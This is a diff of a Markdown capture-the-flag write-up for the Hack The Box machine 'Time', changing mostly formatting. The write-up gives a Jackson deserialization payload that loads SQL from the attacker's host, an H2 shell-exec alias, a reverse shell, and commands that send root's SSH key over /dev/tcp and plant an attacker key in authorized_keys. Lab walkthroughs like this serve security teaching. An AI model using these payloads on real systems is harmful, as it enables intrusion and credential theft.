@@ -2,27 +2,27 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/b40bc088c8cf564cc8693f3b815c9e3b2095d693/linux-machines/medium/machine%3E.infocard.png)
 
-Short description to include any strange things to be dealt with...This machine was dissapointingly easy for a medium box. It definitely should have been classified 'Easy'.  A simple test at the beginning revealed a verbose error message.  Some quick googling leads to an easy to use exploit.  After that simple enumeration leads to a weakly protected script that gets executed as root, and leaves the player a million routes to root through arbitrary code execution.
+Short description to include any strange things to be dealt with...This machine was dissapointingly easy for a medium box. It definitely should have been classified 'Easy'. A simple test at the beginning revealed a verbose error message. Some quick googling leads to an easy to use exploit. After that simple enumeration leads to a weakly protected script that gets executed as root, and leaves the player a million routes to root through arbitrary code execution.
 
 ## Useful Skills and Tools
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.214`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output (.nmap,.gnmap, and .xml) with filenames of `<name>`.
+I started my enumeration with an nmap scan of `10.10.10.214`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nmap -sCV -n -p- -Pn -v -oA time  10.10.10.214 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -49,13 +49,13 @@ ony two ports open, 22- SSH, and 80 - HTTP
 
 ### port 80 HTTP
 
-```
+```text
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('<' (code 60)): expected a valid value (number, String, array, object, 'true', 'false' or 'null')
 ```
 
 Did a test for XSS, got an unhandled Java exception
 
-```
+```text
 (function ($) {
   'use strict';
   /*==================================================================
@@ -105,13 +105,11 @@ Checked the source code for the page, noticed a file `main.js`
 
 Searched for exploits related to com.fasterxml.jackson.core
 
-https://blog.doyensec.com/2019/07/22/jackson-gadgets.html
+[https://blog.doyensec.com/2019/07/22/jackson-gadgets.html](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
 
-https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-through/java/sid-3929
+[https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-through/java/sid-3929](https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce-through/java/sid-3929)
 
-
-
-```
+```text
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
         String[] command = {"bash", "-c", cmd};
         java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
@@ -122,20 +120,17 @@ CALL SHELLEXEC('id > /dev/tcp/10.10.14.159/8081')
 
 test.sql
 
-```
+```text
 "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"}]"
 ```
 
-
-
-```
+```text
 ["ch.qos.logback.core.db.DriverManagerConnectionSource",+{"url"%3a"jdbc%3ah2%3amem%3a%3bTRACE_LEVEL_SYSTEM_OUT%3d3%3bINIT%3dRUNSCRIPT+FROM+'http%3a//10.10.14.159%3a8082/test.sql'"}]
 ```
 
-AFter some testing, I discovered that the POC code had some `\` that they were using to excape the quotes.  These were causing the validator in this case to throw an error.  
+AFter some testing, I discovered that the POC code had some `\` that they were using to excape the quotes. These were causing the validator in this case to throw an error.
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ python3 -m http.server 8082                 
 Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
@@ -145,18 +140,18 @@ Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
 
 After I removed them from my code I got a connection back, downloading my test.sql.
 
-```
+```text
 zweilos@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
 connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36640
 uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)
 ```
 
-I got a connection back on my machine, proving the remote code execution worked.  Next I replaced the `id` command with a reverse shell.  
+I got a connection back on my machine, proving the remote code execution worked. Next I replaced the `id` command with a reverse shell.
 
 ## Initial Foothold
 
-```
+```text
 zweilos@kali:~/htb/time$ nc -lvnp 8081
 listening on [any] 8081 ...
 connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 36644
@@ -178,9 +173,9 @@ pericles@time:/var/www/html$ stty rows 27 columns 104
 pericles@time:/var/www/html$ export TERM=xterm-256color
 ```
 
-After changing the code in my test.sql file and sending it again, I recieved a reverse shell from the machine.  I quickly upgraded to a full TTY and began enumeration.
+After changing the code in my test.sql file and sending it again, I recieved a reverse shell from the machine. I quickly upgraded to a full TTY and began enumeration.
 
-```
+```text
 <?php
 if(isset($_POST['data'])){
         if(isset($_POST['mode']) && $_POST['mode'] === "2"){
@@ -210,19 +205,15 @@ if(isset($_POST['data'])){
 
 index.php for the json validator site had some interesting code in it
 
-
-
-
 ## Road to User
 
 ### Further enumeration
 
 ### Finding user creds
 
-
 ### User.txt
 
-```
+```text
 pericles@time:/$ cd ~
 pericles@time:/home/pericles$ ls -la
 total 44
@@ -247,12 +238,11 @@ f2555e4414a9821013d82bfbdb6d13e3
 
 After checking `pericles`' home directory I found the `user.txt` proof!
 
-
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `pericles`
 
-```
+```text
 default-remote: local
 remotes:
   images:
@@ -267,7 +257,7 @@ aliases: {}
 
 in lxd directory
 
-```
+```text
 pericles@time:/home/pericles/snap/lxd/17886/.config/lxc$ find / -group pericles 2>/dev/null
 /usr/bin/timer_backup.sh
 /dev/shm/payloadah34hL
@@ -312,9 +302,9 @@ pericles@time:/home/pericles/snap/lxd/17886/.config/lxc$ find / -group pericles 
 /opt/json_project/classpath/jackson-annotations-2.9.8.jar
 ```
 
-I did a search for files that the group `pericles` had access to.  
+I did a search for files that the group `pericles` had access to.
 
-```
+```text
 pericles@time:/dev/shm$ ls -la
 total 4
 drwxrwxrwt  2 root     root       60 Mar 16 21:30 .
@@ -326,14 +316,14 @@ pericles@time:/dev/shm$ cat payloadah34hL
 
 The exploit code that I had used to access the machine was saved as a file in `/dev/shm` apparently.
 
-```
+```text
 #!/bin/bash
 zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
-
 ```
-I also found the file `/usr/bin/timer_backup.sh`.  It looked like it was probably a cron script that made backups of the website data.  I decided it would be a good place to check to see if there was anything interesting in old backups
 
-```
+I also found the file `/usr/bin/timer_backup.sh`. It looked like it was probably a cron script that made backups of the website data. I decided it would be a good place to check to see if there was anything interesting in old backups
+
+```text
 pericles@time:/etc$ cat crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -388,43 +378,42 @@ pericles@time:/etc/cron.d$ cat e2scrub_all
 10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
 ```
 
-I searched through all of the crons and didn't find the script.  
+I searched through all of the crons and didn't find the script.
 
-```
+```text
 pericles@time:/etc$ grep -r timer_backup.sh * 2>/dev/null
 systemd/system/web_backup.service:ExecStart=/bin/bash /usr/bin/timer_backup.sh
 ```
 
 Next, I used grep to search for the name of the script in all of the files in `/etc` and got a hit in the `systemd/system/web_backup.service` file.
 
-```
+```text
 pericles@time:/etc$ ls -la systemd/system/web_backup.service
 -rw-r--r-- 1 root root 106 Oct 23 04:57 systemd/system/web_backup.service
 ```
 
-This service was running as root.  
+This service was running as root.
 
-```
+```text
 pericles@time:/etc$ ls -la /usr/bin/timer_backup.sh
 -rwxrw-rw- 1 pericles pericles 88 Mar 16 22:25 /usr/bin/timer_backup.sh
 ```
 
-I double checked the permissions on the script, and saw that it was fully owned by `pericles`, and I could both read and write it.  I decided to change the script to do a backup of root's Private key.
-
+I double checked the permissions on the script, and saw that it was fully owned by `pericles`, and I could both read and write it. I decided to change the script to do a backup of root's Private key.
 
 ### Getting a shell
 
-```
+```text
 #!/bin/bash
 cat /root/.ssh/id_rsa > /dev/tcp/10.10.14.159/8082 2>&1
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
 connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33180
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ cat time.key 
 cat: /root/.ssh/id_rsa: No such file or directory
@@ -432,19 +421,19 @@ cat: /root/.ssh/id_rsa: No such file or directory
 
 Unfortunately it appeared as if there was no `id_rsa` file, or the script was not running as root.
 
-```
+```text
 #!/bin/bash
 echo $(id) > /dev/tcp/10.10.14.159/8082 2>&1
 ```
 
 Next I changed the script so it would send me the user ID information of the context the script was being run under
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082 > time.key
 listening on [any] 8082 ...
 connect to [10.10.14.159] from (UNKNOWN) [10.10.10.214] 33196
-                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ cat time.key
 uid=0(root) gid=0(root) groups=0(root)
@@ -452,15 +441,15 @@ uid=0(root) gid=0(root) groups=0(root)
 
 It was definitely running as root.
 
-```
+```text
 #!/bin/bash
 echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBnfsDltTXRqAn25L5a+Z9ODhDJJYO8Wm37tG//hh4kyxcn6IhZ+pykEkDLSsLIUsomyvY5cC8hFLBw96Hs0w0U=' >>  /root/.ssh/authorized_keys
 echo "Key away! Try to log in through SSH." > /dev/tcp/10.10.14.159/8082
 ```
 
-Next I tried sending my SSH public key to `root`'s `authorized_keys` file.  Each time I modified the script it only took a few seconds until it connected back, but just in case I added a message to let me know when it was done.
+Next I tried sending my SSH public key to `root`'s `authorized_keys` file. Each time I modified the script it only took a few seconds until it connected back, but just in case I added a message to let me know when it was done.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ nc -lvnp 8082                                                                             148 ⨯ 1 ⚙
 listening on [any] 8082 ...
@@ -470,7 +459,7 @@ Key away! Try to log in through SSH.
 
 ### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/time]
 └─$ ssh root@10.10.10.214 -i root.key                                                               1 ⚙
 The authenticity of host '10.10.10.214 (10.10.10.214)' can't be established.
@@ -535,8 +524,7 @@ And that was it!
 
 note: If you ran `script` earlier to log your console, make sure to type exit until you get the "Script done." message, back on your box.
 
-
-
 Thanks to [`egotisticalSW`](https://app.hackthebox.eu/users/94858) & [`felamos`](https://app.hackthebox.eu/users/27390) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
